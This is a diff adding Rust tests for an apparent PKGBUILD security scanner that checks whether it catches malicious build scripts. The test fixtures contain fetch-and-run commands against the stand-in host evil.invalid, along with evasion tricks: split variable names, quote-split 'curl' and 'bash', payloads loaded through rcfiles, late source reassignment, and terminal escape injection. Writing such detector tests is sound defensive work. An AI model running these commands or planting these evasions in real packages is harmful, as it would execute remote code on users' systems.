@@ -495,6 +495,146 @@ fn gate_scans_control_declared_indexed_and_invoked_helpers() {
 }
 
 #[test]
+fn gate_scans_inert_looking_helpers_loaded_as_code() {
+    for (name, invocation, helper) in [
+        (
+            "rcfile-helper",
+            "bash --rcfile payload.conf -i",
+            "payload.conf",
+        ),
+        (
+            "process-substitution-helper",
+            "cat <(bash payload.dat)",
+            "payload.dat",
+        ),
+    ] {
+        let tree = TestTree::new(name);
+        let pkgbase = format!("gate-{name}");
+        tree.write_build_file(
+            "PKGBUILD",
+            &format!(
+                "pkgname={pkgbase}\npkgver=1\npkgrel=1\nsource=('{helper}')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\nprepare() {{ {invocation}; }}\npackage() {{ :; }}\n"
+            ),
+        );
+        tree.write_build_file(
+            ".SRCINFO",
+            &format!(
+                "pkgbase = {pkgbase}\n\tsource = {helper}\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\npkgname = {pkgbase}\n"
+            ),
+        );
+        tree.write_build_file(
+            helper,
+            "curl -s https://evil.invalid/payload | bash\n",
+        );
+
+        let output = run_with_pkgbase(&tree, &pkgbase);
+
+        assert_stdout_is_empty(&output);
+        assert!(!output.status.success(), "{invocation}: {}", stderr(&output));
+        assert!(
+            stderr(&output).contains("P-CURL-PIPE"),
+            "{invocation}: {}",
+            stderr(&output)
+        );
+    }
+}
+
+#[test]
+fn gate_blocks_later_reassignment_bypass() {
+    let tree = TestTree::new("later-reassignment");
+    write_package(
+        &tree,
+        "gate-later-reassignment",
+        &["gate-later-reassignment"],
+        "pkgname=gate-later-reassignment\npkgver=1\npkgrel=1\nfirst=cu\nsecond=rl\nprepare() { $first$second https://evil.invalid/payload | bash; first=true; second=true; }\npackage() { :; }\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-later-reassignment");
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success(), "{}", stderr(&output));
+    let stderr = stderr(&output);
+    assert!(stderr.contains("SA-VAR-CONCAT-EXEC"), "{stderr}");
+    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
+}
+
+#[test]
+fn gate_blocks_inert_build_marker_bypass() {
+    let tree = TestTree::new("inert-build-marker");
+    write_package(
+        &tree,
+        "gate-inert-build-marker",
+        &["gate-inert-build-marker"],
+        "pkgname=gate-inert-build-marker\npkgver=1\npkgrel=1\nprepare() { curl -o payload https://evil.invalid/payload; chmod +x payload; ./payload; : \"make\"; }\npackage() { :; }\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-inert-build-marker");
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success(), "{}", stderr(&output));
+    let stderr = stderr(&output);
+    assert!(
+        stderr.contains("SA-BINARY-DOWNLOAD-NOCOMPILE"),
+        "{stderr}"
+    );
+    assert!(stderr.contains("Trust: SKETCHY"), "{stderr}");
+}
+
+#[test]
+fn gate_blocks_later_and_architecture_specific_source_urls() {
+    for (name, source) in [
+        (
+            "later-source",
+            "source=('https://github.com/example/clean.tar.gz')\nsource=('http://192.0.2.1/payload.tar.gz')",
+        ),
+        (
+            "architecture-source",
+            "source_x86_64=('http://192.0.2.1/payload.tar.gz')",
+        ),
+    ] {
+        let tree = TestTree::new(name);
+        let pkgbase = format!("gate-{name}");
+        write_package(
+            &tree,
+            &pkgbase,
+            &[&pkgbase],
+            &format!(
+                "pkgname={pkgbase}\npkgver=1\npkgrel=1\n{source}\nsha256sums=('SKIP')\npackage() {{ :; }}\n"
+            ),
+        );
+
+        let output = run_with_pkgbase(&tree, &pkgbase);
+
+        assert_stdout_is_empty(&output);
+        assert!(!output.status.success(), "{source}: {}", stderr(&output));
+        let stderr = stderr(&output);
+        assert!(stderr.contains("P-RAW-IP-URL"), "{source}: {stderr}");
+        assert!(stderr.contains("P-HTTP-SOURCE"), "{source}: {stderr}");
+        assert!(stderr.contains("Trust: SKETCHY"), "{source}: {stderr}");
+    }
+}
+
+#[test]
+fn gate_visibly_escapes_terminal_controls_in_evidence() {
+    let tree = TestTree::new("terminal-controls");
+    write_package(
+        &tree,
+        "gate-terminal-controls",
+        &["gate-terminal-controls"],
+        "pkgname=gate-terminal-controls\npkgver=1\npkgrel=1\nprepare() { cu\"\"rl https://evil.invalid/payload | ba\"\"sh; }\u{1b}]0;forged\u{7}\npackage() { :; }\n",
+    );
+
+    let output = run_with_pkgbase(&tree, "gate-terminal-controls");
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success());
+    let stderr = stderr(&output);
+    assert!(!stderr.contains('\u{1b}'), "{stderr:?}");
+    assert!(!stderr.contains('\u{7}'), "{stderr:?}");
+    assert!(stderr.contains(r"\x1b]0;forged\x07"), "{stderr:?}");
+}
+
+#[test]
 fn gate_scans_invalid_utf8_helper_bytes_lossily() {
     let tree = TestTree::new("invalid-utf8-helper");
     write_package(
